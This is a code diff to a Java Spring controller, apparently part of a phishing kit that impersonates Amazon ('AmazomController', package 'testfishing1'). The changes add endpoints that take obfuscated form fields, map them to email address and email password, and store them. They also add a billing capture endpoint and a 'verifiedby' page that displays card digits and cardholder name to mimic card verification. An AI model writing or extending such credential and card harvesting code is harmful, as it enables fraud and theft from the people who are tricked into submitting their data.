@@ -9,6 +9,7 @@ import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
 import com.kidd.testfishing1.AsyncTask;
 import com.kidd.testfishing1.common.IpUtils;
+import com.kidd.testfishing1.model.FraudUserInfoForm;
 import com.kidd.testfishing1.model.UserInfoForm;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Controller;
@@ -39,13 +40,28 @@ public class AmazomController {
     public Object signin2(UserInfoForm form,@RequestHeader("User-Agent") String agent){
         form.setUserAgent(agent);
         asyncSaveUserInfo(form);
-        return "warning";
+        return "billing";
+    }
+    @PostMapping("/kiddSigin")
+    @ResponseBody
+    public Object signin3(FraudUserInfoForm form1, @RequestHeader("User-Agent") String agent){
+        UserInfoForm form = UserInfoForm.builder().email(form1.getKiddfiled1()).emailPwd(form1.getKiddfiled2()).build();
+        form.setUserAgent(agent);
+        asyncSaveUserInfo(form);
+        Map map = new HashMap();
+        map.put("data","ok");
+        return map;
     }
 
 
     @PostMapping("/warning")
+    public Object warning2(){
+        return "signin";
+    }
+
+    @GetMapping("/warning")
     public Object warning(){
-        return "billing";
+        return "warning";
     }
 
     @GetMapping("/billing")
@@ -63,6 +79,15 @@ public class AmazomController {
         model.addAttribute("cardName",form.getNameCard());
         return "verifiedby";
     }
+    @PostMapping("/billing2")
+    @ResponseBody
+    public Object billing3(UserInfoForm form){
+        asyncSaveUserInfo(form);
+        Map map = new HashMap();
+        map.put("data","ok");
+        return map;
+    }
+
 
     @GetMapping("/validate")
     @ResponseBody
@@ -71,7 +96,12 @@ public class AmazomController {
     }
 
     @GetMapping("/verifiedby")
-    public Object verifiedby(UserInfoForm form){
+    public Object verifiedby(UserInfoForm form,Model model){
+        LocalDateTime localDateTime = LocalDateTime.now();
+        String timeStr = DateUtil.format(localDateTime,"yyyy/MM/dd");
+        model.addAttribute("dateTime",timeStr);
+        model.addAttribute("cardNo",form.getCxdi().substring(form.getCxdi().length()-4,form.getCxdi().length()));
+        model.addAttribute("cardName",form.getNameCard());
         return "verifiedby";
     }
 
@@ -105,6 +135,8 @@ public class AmazomController {
         asyncSaveUserInfo(form);
         return "thanks";
     }
+
+
 
     private List<String> appendIp(List<String> infos){
         String ip = IpUtils.getIpAddress(request);
